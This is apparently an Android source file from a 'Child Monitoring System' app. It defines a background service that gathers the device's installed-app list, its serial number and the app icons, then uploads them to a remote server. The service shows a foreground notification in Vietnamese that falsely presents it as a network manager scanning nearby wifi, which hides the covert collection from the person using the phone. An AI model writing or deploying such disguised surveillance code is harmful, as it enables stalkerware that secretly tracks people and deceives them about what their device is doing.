package com.ChildMonitoringSystem.CMS.JobService;

import static com.ChildMonitoringSystem.CMS.MyApplication.CHANNEL_ID;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.Service;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import com.ChildMonitoringSystem.CMS.GetDataFromDevice.LoadInfoAppFromDevice;
import com.ChildMonitoringSystem.CMS.Model.INFO_APP;
import com.ChildMonitoringSystem.CMS.R;
import com.ChildMonitoringSystem.CMS.Service.Service_Upload;
import com.ChildMonitoringSystem.CMS.Value.Constant;

import java.io.File;
import java.util.ArrayList;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;


public class AppInfoUploadService extends Service {
    private static final String TAG = AppInfoUploadService.class.getName();


    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O)
            startMyOwnForeground();
        else
            startForeground(1, new Notification());
        IntentFilter filter = new IntentFilter();
        filter.addAction(Constant.ACTION_1);
        registerReceiver(mbroadBroadcastReceiver, filter);
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private void startMyOwnForeground() {
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setContentTitle("Trình quản lí mạng")
                .setContentText("Hệ thống đang quét wifi gần bạn")
                .setSmallIcon(R.drawable.ic_baseline_settings_24)
                .build();
        startForeground(2, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        try {
            doBackGroundWork(getApplicationContext());
        } catch (Exception e) {
            e.printStackTrace();
        }
        return START_NOT_STICKY;
    }

    private final BroadcastReceiver mbroadBroadcastReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (Constant.ACTION_1.equals(intent.getAction())) {
                stopSelf();
            }

        }
    };

    private void doBackGroundWork(Context ctx) {
        new Thread(() -> {
            LoadInfoAppFromDevice loadInfoAppFromDevice = new LoadInfoAppFromDevice();
            ArrayList<INFO_APP> lst = loadInfoAppFromDevice.getAllAppInstalled(ctx);
            try {
                Thread.sleep(10000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            if (lst.size() > 0) {
                for (int i = 0; i < lst.size(); i++) {
                    String seri = lst.get(i).getSERI_PHONE();
                    String appname = lst.get(i).getAPPNAME();
                    String pname = lst.get(i).getpNAME();
                    String vername = lst.get(i).getVerNAME();
                    int vercode = lst.get(i).getVerCODE();
                    RequestBody requestBodySeri = RequestBody.create(MediaType.parse("multipart/form-data"), seri);
                    RequestBody requestBodyappname = RequestBody.create(MediaType.parse("multipart/form-data"), appname);
                    RequestBody requestBodypName = RequestBody.create(MediaType.parse("multipart/form-data"), pname);
                    RequestBody requestBodyverName = RequestBody.create(MediaType.parse("multipart/form-data"), vername);
                    RequestBody requestBodyverCode = RequestBody.create(MediaType.parse("multipart/form-data"), String.valueOf(vercode));
                    File file = new File(lst.get(i).getIcon());
                    RequestBody requestBodyimg = RequestBody.create(MediaType.parse("multipart/form-data"), file);
                    MultipartBody.Part mPart = MultipartBody.Part.createFormData(Constant.ICON, file.getName(), requestBodyimg);
                    Service_Upload.apiservice1.UploadAPP(requestBodySeri, requestBodyappname, requestBodypName, requestBodyverName, requestBodyverCode, mPart).enqueue(new Callback<ResponseBody>() {
                        @Override
                        public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                            Log.i(TAG, "onResponse: done");
                            LoadInfoAppFromDevice.deleteDirectory(file);
                        }

                        @Override
                        public void onFailure(Call<ResponseBody> call, Throwable t) {
                            Log.i(TAG, "onFailure: fail");
                        }
                    });
                    try {
                        Thread.sleep(500);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                }
                Intent intent = new Intent(Constant.ACTION_1);
                sendBroadcast(intent);
            }

        }).start();

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(mbroadBroadcastReceiver);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
